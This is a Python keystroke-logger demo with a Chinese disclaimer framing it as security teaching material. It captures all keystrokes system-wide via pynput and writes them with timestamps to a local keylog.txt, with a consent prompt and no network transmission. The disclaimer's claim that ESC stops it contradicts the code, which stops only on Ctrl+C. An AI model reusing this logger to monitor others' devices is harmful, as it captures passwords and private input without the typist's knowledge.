# -*- coding: utf-8 -*-
"""
=====================================================================
【免责声明】
本程序是一个信息安全教学演示程序（Demo），仅用于展示键盘监听
类程序的基本工作原理，帮助学习者理解此类威胁并提升防护意识。

使用限制（务必阅读并遵守）：
1. 仅限在本人拥有所有权、或已获得设备所有者明确授权的设备上
   运行与学习；
2. 严禁用于监控他人、窃取他人账号密码等任何违法违规用途，
   由此产生的一切法律责任由使用者自行承担；
3. 本程序为前台可见程序：不隐藏窗口、不后台静默运行、不开机
   自启、不向任何远程地址传输数据，按 ESC 可随时停止退出；
4. 请遵守所在地区法律法规，作者不对程序的滥用行为负责。
=====================================================================
"""

import os
import sys
from datetime import datetime

from pynput import keyboard

# ------------------------- 基本配置 -------------------------

# 日志文件名（固定写在 exe / 脚本所在目录，便于查找）
LOG_FILE_NAME = "keylog.txt"

# 日志内时间戳：每行行首 [HH:MM:SS]；打字停顿超过 IDLE_STAMP_SEC 秒时补新锚点
STAMP_FMT = "%H:%M:%S"
IDLE_STAMP_SEC = 30

# 常见特殊按键 -> 日志中的标记文本（键名来自 pynput 的 Key.name，
# 未列出的按键（如 F1~F12、媒体键）自动按 "[键名大写]" 标记）
SPECIAL_KEYS = {
    "space":        "[SPACE]",
    "enter":        "[ENTER]",
    "esc":          "[ESC]",
    "tab":          "[TAB]",
    "backspace":    "[BACKSPACE]",
    "delete":       "[DELETE]",
    "insert":       "[INSERT]",
    "shift":        "[SHIFT]",
    "shift_l":      "[SHIFT]",
    "shift_r":      "[SHIFT]",
    "ctrl":         "[CTRL]",
    "ctrl_l":       "[CTRL]",
    "ctrl_r":       "[CTRL]",
    "alt":          "[ALT]",
    "alt_l":        "[ALT]",
    "alt_r":        "[ALT]",
    "alt_gr":       "[ALTGR]",
    "caps_lock":    "[CAPSLOCK]",
    "cmd":          "[WIN]",
    "cmd_l":        "[WIN]",
    "cmd_r":        "[WIN]",
    "print_screen": "[PRTSC]",
    "num_lock":     "[NUMLOCK]",
    "up":           "[UP]",
    "down":         "[DOWN]",
    "left":         "[LEFT]",
    "right":        "[RIGHT]",
    "home":         "[HOME]",
    "end":          "[END]",
    "page_up":      "[PAGEUP]",
    "page_down":    "[PAGEDOWN]",
}


def get_log_path():
    """返回日志文件完整路径。

    PyInstaller 打包成 exe 后取 exe 所在目录（sys.frozen），
    直接用 python 运行时取脚本所在目录，保证日志总在程序旁边。
    """
    if getattr(sys, "frozen", False):                     # exe 运行环境
        base_dir = os.path.dirname(sys.executable)
    else:                                                # 脚本运行环境
        base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, LOG_FILE_NAME)


def format_key(key):
    """把一次按键格式化为日志文本。

    普通可打印字符原样返回（Shift+a 到达回调时已是 'A'，无需拼接）；
    特殊按键（空格、回车、Shift、Tab、Backspace 等）返回 [标记]；
    Ctrl+字母 会产生 1~26 的控制字符，还原成 [CTRL+X] 便于阅读。
    """
    ch = getattr(key, "char", None)
    if ch:                                                # 有字符属性的按键
        if ch.isprintable():
            return ch
        if 1 <= ord(ch) <= 26:                            # Ctrl+字母的控制字符
            return "[CTRL+%s]" % chr(ord(ch) + 64)
        return "[CTRL+?]"
    # 无字符属性 => 功能键 / 修饰键，按 Key.name 查表标记
    name = getattr(key, "name", None) or "UNKNOWN"
    return SPECIAL_KEYS.get(name, "[%s]" % name.upper())


class KeyLogDemo:
    """键盘监听演示：控制台实时打印按键，同时写入本地 keylog.txt。"""

    def __init__(self, log_path):
        self.log_path = log_path
        self.count = 0                                    # 本次会话记录的按键数
        self._file = None                                 # 日志文件句柄
        self._need_stamp = True                           # 下一个按键前需要补时间戳
        self._last_stamp = datetime.now()                 # 上次写时间锚点的时刻

    def _stamp_if_needed(self, force=False):
        """按需写入时间锚点：新起一行或停顿超过 IDLE_STAMP_SEC 秒时。"""
        now = datetime.now()
        if self._need_stamp or force or \
                (now - self._last_stamp).total_seconds() >= IDLE_STAMP_SEC:
            if not self._need_stamp and not force:
                self._file.write("\n")                    # 停顿锚点：先结束旧行
            text = "[%s] " % now.strftime(STAMP_FMT)
            self._file.write(text)
            try:
                print(("\n" if not self._need_stamp and not force else "") + text,
                      end="", flush=True)
            except UnicodeEncodeError:
                pass
            self._need_stamp = False
        self._last_stamp = now

    def _on_press(self, key):
        """pynput 按键回调。ESC 不再承担停止功能，照常记录为 [ESC]；
        停止监听用 Ctrl+C 或直接关闭窗口。"""
        text = format_key(key)
        self.count += 1
        self._stamp_if_needed()

        # 1) 控制台实时打印（不换行，还原输入流的样子）
        try:
            print(text, end="", flush=True)
            if text == "[ENTER]":
                print()
        except UnicodeEncodeError:
            pass                                          # 个别字符无法在当前控制台显示时忽略

        # 2) 写入日志文件（每次 flush，保证异常退出时日志也不丢失）
        self._file.write(text)
        if text == "[ENTER]":                             # 回车后换行，下一行重新打时间戳
            self._file.write("\n")
            self._need_stamp = True
        self._file.flush()

    def run(self):
        """主流程：免责声明确认 -> 打开日志 -> 启动监听（阻塞）-> 收尾退出。"""
        print("=" * 60)
        print("  键盘监听教学 Demo（仅限本人授权设备学习使用）")
        print("  本程序仅用于信息安全教学演示：严禁用于监控他人、窃取")
        print("  账号密码等任何违法违规用途，一切法律责任由使用者承担。")
        print("=" * 60)
        try:
            answer = input("  已阅读并同意以上免责声明？输入 yes 继续：").strip().lower()
        except (EOFError, KeyboardInterrupt):
            answer = ""                                 # 非交互 stdin / Ctrl+C 视为拒绝
        if answer not in ("y", "yes"):
            print("  未同意免责声明，程序退出。")
            return

        self._file = open(self.log_path, "a", encoding="utf-8")
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self._file.write("==== 会话开始 %s ====\n" % now)
        self._file.flush()

        print("  日志文件：%s" % self.log_path)
        print("  按 Ctrl+C 停止监听并退出（或直接关闭本窗口）")
        self._stamp_if_needed(force=True)                 # 行首先打一个时间戳

        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()                           # 阻塞，直到 ESC 触发停止
        except KeyboardInterrupt:
            print("\n[提示] 收到 Ctrl+C，强制停止。")
        finally:
            self._file.write("\n")                        # 结束当前未换行的行
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self._file.write("==== 会话结束 %s（共 %d 个按键）====\n" % (now, self.count))
            self._file.close()
            print("\n[提示] 监听已停止，本次共记录 %d 个按键。" % self.count)
            print("[提示] 日志已保存到：%s" % self.log_path)


if __name__ == "__main__":
    KeyLogDemo(get_log_path()).run()
